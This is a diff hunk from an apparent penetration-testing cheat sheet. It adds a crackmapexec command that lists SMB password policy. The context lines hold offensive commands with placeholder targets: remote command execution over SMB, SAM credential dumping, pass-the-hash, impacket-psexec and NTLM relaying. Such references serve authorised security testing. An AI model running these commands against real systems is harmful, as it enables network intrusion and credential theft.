@@ -325,6 +325,7 @@ $ crackmapexec smb <IP address> -u <username> -p '<password>' -x 'whoami' --exec
 $ crackmapexec smb <IP address> -u <username> -p '<password>' -X 'Get-Process' --exec-method smbexec
 $ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-users
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
+$ crackmapexec smb <IP address> -u <username> -p '<password>' --pass-pol
 $ crackmapexec smb <IP address> -u <username> -H <hash>
 $ impacket-psexec <username>:'<password>'@<IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>        # Ensure SMB = Off in /etc/responder/Responder.conf, and 
